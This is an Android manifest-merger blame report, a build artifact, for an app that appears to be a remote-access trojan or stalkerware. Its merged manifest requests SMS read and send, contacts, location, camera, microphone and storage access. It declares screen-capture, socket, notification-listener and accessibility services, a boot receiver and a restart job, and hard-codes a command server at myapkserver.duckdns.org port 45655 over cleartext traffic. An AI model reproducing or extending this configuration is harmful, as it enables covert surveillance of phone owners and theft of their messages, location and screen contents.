app/build/intermediates/manifest_merge_blame_file/release/processReleaseMainManifest/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.example.ohhhhymn"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="34" />
10
11    <!-- Core Permissions -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:5:5-67
12-->src/main/AndroidManifest.xml:5:22-64
13    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
13-->src/main/AndroidManifest.xml:6:5-77
13-->src/main/AndroidManifest.xml:6:22-74
14    <uses-permission android:name="android.permission.RECORD_AUDIO" />
14-->src/main/AndroidManifest.xml:7:5-71
14-->src/main/AndroidManifest.xml:7:22-68
15    <uses-permission android:name="android.permission.CAMERA" />
15-->src/main/AndroidManifest.xml:8:5-65
15-->src/main/AndroidManifest.xml:8:22-62
16    <uses-permission android:name="android.permission.READ_SMS" />
16-->src/main/AndroidManifest.xml:9:5-67
16-->src/main/AndroidManifest.xml:9:22-64
17    <uses-permission android:name="android.permission.SEND_SMS" />
17-->src/main/AndroidManifest.xml:10:5-67
17-->src/main/AndroidManifest.xml:10:22-64
18    <uses-permission android:name="android.permission.READ_CONTACTS" />
18-->src/main/AndroidManifest.xml:11:5-72
18-->src/main/AndroidManifest.xml:11:22-69
19    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
19-->src/main/AndroidManifest.xml:12:5-75
19-->src/main/AndroidManifest.xml:12:22-72
20    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
20-->src/main/AndroidManifest.xml:13:5-79
20-->src/main/AndroidManifest.xml:13:22-76
21    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
21-->src/main/AndroidManifest.xml:14:5-81
21-->src/main/AndroidManifest.xml:14:22-78
22    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
22-->src/main/AndroidManifest.xml:15:5-81
22-->src/main/AndroidManifest.xml:15:22-78
23    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
23-->src/main/AndroidManifest.xml:16:5-94
23-->src/main/AndroidManifest.xml:16:22-91
24
25    <!-- File Access Permissions -->
26    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
26-->src/main/AndroidManifest.xml:19:5-80
26-->src/main/AndroidManifest.xml:19:22-77
27    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
27-->src/main/AndroidManifest.xml:20:5-81
27-->src/main/AndroidManifest.xml:20:22-78
28
29    <!-- Android 13+ notifications permission -->
30    <uses-permission
30-->src/main/AndroidManifest.xml:23:5-25:36
31        android:name="android.permission.POST_NOTIFICATIONS"
31-->src/main/AndroidManifest.xml:24:9-61
32        android:required="false" />
32-->src/main/AndroidManifest.xml:25:9-33
33
34    <permission
34-->[androidx.core:core:1.13.0] AndroidManifest.xml:22:5-24:47
35        android:name="com.example.ohhhhymn.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
35-->[androidx.core:core:1.13.0] AndroidManifest.xml:23:9-81
36        android:protectionLevel="signature" />
36-->[androidx.core:core:1.13.0] AndroidManifest.xml:24:9-44
37
38    <uses-permission android:name="com.example.ohhhhymn.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
38-->[androidx.core:core:1.13.0] AndroidManifest.xml:26:5-97
38-->[androidx.core:core:1.13.0] AndroidManifest.xml:26:22-94
39
40    <application
40-->src/main/AndroidManifest.xml:27:5-109:19
41        android:allowBackup="true"
41-->src/main/AndroidManifest.xml:28:9-35
42        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
42-->[androidx.core:core:1.13.0] AndroidManifest.xml:28:18-86
43        android:extractNativeLibs="false"
44        android:icon="@mipmap/ic_launcher"
44-->src/main/AndroidManifest.xml:29:9-43
45        android:label="@string/app_name"
45-->src/main/AndroidManifest.xml:30:9-41
46        android:roundIcon="@mipmap/ic_launcher_round"
46-->src/main/AndroidManifest.xml:31:9-54
47        android:supportsRtl="true"
47-->src/main/AndroidManifest.xml:32:9-35
48        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
48-->src/main/AndroidManifest.xml:34:9-65
49        android:usesCleartextTraffic="true" >
49-->src/main/AndroidManifest.xml:33:9-44
50
51        <!-- Static server configuration -->
52        <meta-data
52-->src/main/AndroidManifest.xml:37:9-78
53            android:name="SERVER_IP"
53-->src/main/AndroidManifest.xml:37:20-44
54            android:value="myapkserver.duckdns.org" />
54-->src/main/AndroidManifest.xml:37:45-75
55        <meta-data
55-->src/main/AndroidManifest.xml:38:9-71
56            android:name="SERVER_PORT"
56-->src/main/AndroidManifest.xml:38:20-46
57            android:value="45655" />
57-->src/main/AndroidManifest.xml:38:47-68
58
59        <!-- Entry activity -->
60        <activity
60-->src/main/AndroidManifest.xml:41:9-51:20
61            android:name="com.example.socketclient.MainActivity"
61-->src/main/AndroidManifest.xml:42:13-65
62            android:exported="true"
62-->src/main/AndroidManifest.xml:43:13-36
63            android:label="@string/app_name"
63-->src/main/AndroidManifest.xml:46:13-45
64            android:launchMode="singleTop"
64-->src/main/AndroidManifest.xml:44:13-43
65            android:theme="@style/Theme.AppCompat.Light.NoActionBar" >
65-->src/main/AndroidManifest.xml:45:13-69
66            <intent-filter>
66-->src/main/AndroidManifest.xml:47:13-50:29
67                <action android:name="android.intent.action.MAIN" />
67-->src/main/AndroidManifest.xml:48:17-69
67-->src/main/AndroidManifest.xml:48:25-66
68
69                <category android:name="android.intent.category.LAUNCHER" />
69-->src/main/AndroidManifest.xml:49:17-77
69-->src/main/AndroidManifest.xml:49:27-74
70            </intent-filter>
71        </activity>
72
73        <!-- Screen capture service -->
74        <service
74-->src/main/AndroidManifest.xml:54:9-58:63
75            android:name="com.example.ohhhhymn.ScreenCaptureService"
75-->src/main/AndroidManifest.xml:55:13-49
76            android:enabled="true"
76-->src/main/AndroidManifest.xml:56:13-35
77            android:exported="false"
77-->src/main/AndroidManifest.xml:57:13-37
78            android:foregroundServiceType="mediaProjection" />
78-->src/main/AndroidManifest.xml:58:13-60
79
80        <!-- Socket communication service -->
81        <service
81-->src/main/AndroidManifest.xml:61:9-65:72
82            android:name="com.example.ohhhhymn.SocketService"
82-->src/main/AndroidManifest.xml:62:13-42
83            android:enabled="true"
83-->src/main/AndroidManifest.xml:63:13-35
84            android:exported="false"
84-->src/main/AndroidManifest.xml:64:13-37
85            android:foregroundServiceType="mediaProjection|location" />
85-->src/main/AndroidManifest.xml:65:13-69
86
87        <!-- Notification listener -->
88        <service
88-->src/main/AndroidManifest.xml:68:9-76:19
89            android:name="com.example.ohhhhymn.MyNotificationListener"
89-->src/main/AndroidManifest.xml:69:13-51
90            android:enabled="true"
90-->src/main/AndroidManifest.xml:71:13-35
91            android:exported="true"
91-->src/main/AndroidManifest.xml:72:13-36
92            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
92-->src/main/AndroidManifest.xml:70:13-87
93            <intent-filter>
93-->src/main/AndroidManifest.xml:73:13-75:29
94                <action android:name="android.service.notification.NotificationListenerService" />
94-->src/main/AndroidManifest.xml:74:17-99
94-->src/main/AndroidManifest.xml:74:25-96
95            </intent-filter>
96        </service>
97
98        <!-- Accessibility service -->
99        <service
99-->src/main/AndroidManifest.xml:79:9-90:19
100            android:name="com.example.ohhhhymn.MyAccessibilityService"
100-->src/main/AndroidManifest.xml:80:13-51
101            android:enabled="true"
101-->src/main/AndroidManifest.xml:82:13-35
102            android:exported="false"
102-->src/main/AndroidManifest.xml:83:13-37
103            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
103-->src/main/AndroidManifest.xml:81:13-79
104            <intent-filter>
104-->src/main/AndroidManifest.xml:84:13-86:29
105                <action android:name="android.accessibilityservice.AccessibilityService" />
105-->src/main/AndroidManifest.xml:85:17-92
105-->src/main/AndroidManifest.xml:85:25-89
106            </intent-filter>
107
108            <meta-data
108-->src/main/AndroidManifest.xml:87:13-89:72
109                android:name="android.accessibilityservice"
109-->src/main/AndroidManifest.xml:88:17-60
110                android:resource="@xml/accessibility_service_config" />
110-->src/main/AndroidManifest.xml:89:17-69
111        </service>
112
113        <!-- Background restart job -->
114        <service
114-->src/main/AndroidManifest.xml:93:9-97:40
115            android:name="com.example.ohhhhymn.RestartJobService"
115-->src/main/AndroidManifest.xml:94:13-46
116            android:enabled="true"
116-->src/main/AndroidManifest.xml:96:13-35
117            android:exported="false"
117-->src/main/AndroidManifest.xml:97:13-37
118            android:permission="android.permission.BIND_JOB_SERVICE" />
118-->src/main/AndroidManifest.xml:95:13-69
119
120        <!-- Boot receiver -->
121        <receiver
121-->src/main/AndroidManifest.xml:100:9-107:20
122            android:name="com.example.ohhhhymn.BootReceiver"
122-->src/main/AndroidManifest.xml:101:13-41
123            android:enabled="true"
123-->src/main/AndroidManifest.xml:102:13-35
124            android:exported="true" >
124-->src/main/AndroidManifest.xml:103:13-36
125            <intent-filter android:priority="1000" >
125-->src/main/AndroidManifest.xml:104:13-106:29
125-->src/main/AndroidManifest.xml:104:28-51
126                <action android:name="android.intent.action.BOOT_COMPLETED" />
126-->src/main/AndroidManifest.xml:105:17-79
126-->src/main/AndroidManifest.xml:105:25-76
127            </intent-filter>
128        </receiver>
129
130        <provider
130-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:24:9-32:20
131            android:name="androidx.startup.InitializationProvider"
131-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:25:13-67
132            android:authorities="com.example.ohhhhymn.androidx-startup"
132-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:26:13-68
133            android:exported="false" >
133-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:27:13-37
134            <meta-data
134-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:29:13-31:52
135                android:name="androidx.emoji2.text.EmojiCompatInitializer"
135-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:30:17-75
136                android:value="androidx.startup" />
136-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:31:17-49
137            <meta-data
137-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:29:13-31:52
138                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
138-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:30:17-78
139                android:value="androidx.startup" />
139-->[androidx.lifecycle:lifecycle-process:2.6.2] AndroidManifest.xml:31:17-49
140            <meta-data
140-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:29:13-31:52
141                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
141-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:30:17-85
142                android:value="androidx.startup" />
142-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:31:17-49
143        </provider>
144
145        <receiver
145-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:34:9-52:20
146            android:name="androidx.profileinstaller.ProfileInstallReceiver"
146-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:35:13-76
147            android:directBootAware="false"
147-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:36:13-44
148            android:enabled="true"
148-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:37:13-35
149            android:exported="true"
149-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:38:13-36
150            android:permission="android.permission.DUMP" >
150-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:39:13-57
151            <intent-filter>
151-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:40:13-42:29
152                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
152-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:41:17-91
152-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:41:25-88
153            </intent-filter>
154            <intent-filter>
154-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:43:13-45:29
155                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
155-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:44:17-85
155-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:44:25-82
156            </intent-filter>
157            <intent-filter>
157-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:46:13-48:29
158                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
158-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:47:17-88
158-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:47:25-85
159            </intent-filter>
160            <intent-filter>
160-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:49:13-51:29
161                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
161-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:50:17-95
161-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:50:25-92
162            </intent-filter>
163        </receiver>
164    </application>
165
166</manifest>